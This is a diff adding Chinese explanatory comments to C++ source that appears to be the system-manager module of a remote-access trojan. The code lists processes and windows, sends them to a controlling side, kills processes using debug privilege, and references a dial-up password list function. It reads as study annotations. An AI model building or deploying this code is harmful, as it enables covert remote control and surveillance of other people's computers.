@@ -49,10 +49,13 @@ void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 void CSystemManager::SendProcessList()
 {
 	UINT	nRet = -1;
+
+	//调用getProcessList得到当前进程的数据 --->lpBuffer
 	LPBYTE	lpBuffer = getProcessList();
 	if (lpBuffer == NULL)
 		return;
 	
+	//发送函数 父类函数send 将遍历到的进程数据发送
 	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
 	LocalFree(lpBuffer);
 }
@@ -103,11 +106,15 @@ void CSystemManager::SendDialupassList()
 	LocalFree(lpBuffer);
 	
 }
+
+
+//结束进程
 void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)
 {
 	HANDLE hProcess = NULL;
 	DebugPrivilege(SE_DEBUG_NAME, TRUE);
 	
+	// 因为结束的可能不止是一个进程所以用循环
 	for (int i = 0; i < nSize; i += 4)
 	{
 		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(lpBuffer + i));
@@ -125,17 +132,20 @@ void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)
 
 LPBYTE CSystemManager::getProcessList()
 {
-	HANDLE			hSnapshot = NULL;
-	HANDLE			hProcess = NULL;
-	HMODULE			hModules = NULL;
+	HANDLE			hSnapshot = NULL;	//快照句柄
+	HANDLE			hProcess = NULL;	//进程句柄
+	HMODULE			hModules = NULL;	//进程模块句柄
 	PROCESSENTRY32	pe32 = {0};
 	DWORD			cbNeeded;
-	char			strProcessName[MAX_PATH] = {0};
-	LPBYTE			lpBuffer = NULL;
+	char			strProcessName[MAX_PATH] = {0};	//进程名称
+	LPBYTE			lpBuffer = NULL;				//
 	DWORD			dwOffset = 0;
 	DWORD			dwLength = 0;
+
+	//提取权限
 	DebugPrivilege(SE_DEBUG_NAME, TRUE);
 	
+	//创建一个进程快照
 	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	
 	if(hSnapshot == INVALID_HANDLE_VALUE)
@@ -143,19 +153,27 @@ LPBYTE CSystemManager::getProcessList()
 	
 	pe32.dwSize = sizeof(PROCESSENTRY32);
 	
+
+	//分配一下缓冲区
 	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
 	
+	//数据类型,与控制端共有的枚举类型，表示这是进程的类型数据
 	lpBuffer[0] = TOKEN_PSLIST;
 	dwOffset = 1;
 	
+	//得到第一个进程，调用失败就反回
 	if(Process32First(hSnapshot, &pe32))
 	{	  
 		do
 		{      
+			//打开进程句柄
 			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
 			if ((pe32.th32ProcessID !=0 ) && (pe32.th32ProcessID != 4) && (pe32.th32ProcessID != 8))
 			{
+				//枚举第一个模块句柄
 				EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
+				
+				//获取自身名称
 				GetModuleFileNameEx(hProcess, hModules, strProcessName, sizeof(strProcessName));
 				
 				// 此进程占用数据大小
@@ -164,6 +182,8 @@ LPBYTE CSystemManager::getProcessList()
 				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
 					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
 				
+
+				//三个memcpy就是向缓冲区里存放数据 数据结构是 进程ID+进程名+0+进程完整名+0
 				memcpy(lpBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
 				dwOffset += sizeof(DWORD);	
 				
@@ -174,9 +194,9 @@ LPBYTE CSystemManager::getProcessList()
 				dwOffset += lstrlen(strProcessName) + 1;
 			}
 		}
-		while(Process32Next(hSnapshot, &pe32));
+		while(Process32Next(hSnapshot, &pe32));//下一个进程
 	}
-	
+	//用lpbuffer获得整个缓冲去 
 	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
 	
 	DebugPrivilege(SE_DEBUG_NAME, FALSE); 
@@ -250,6 +270,9 @@ bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
 LPBYTE CSystemManager::getWindowsList()
 {
 	LPBYTE	lpBuffer = NULL;
+
+	//枚举屏幕上的所有的顶层窗口，轮流地将这些窗口的句柄传递给一个应用程序定义的回调函数。
+	//EnumWindows会一直进行下去，直到枚举完所有的顶层窗口，或者回调函数返回了FALSE.
 	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
 	lpBuffer[0] = TOKEN_WSLIST;
 	return lpBuffer;	
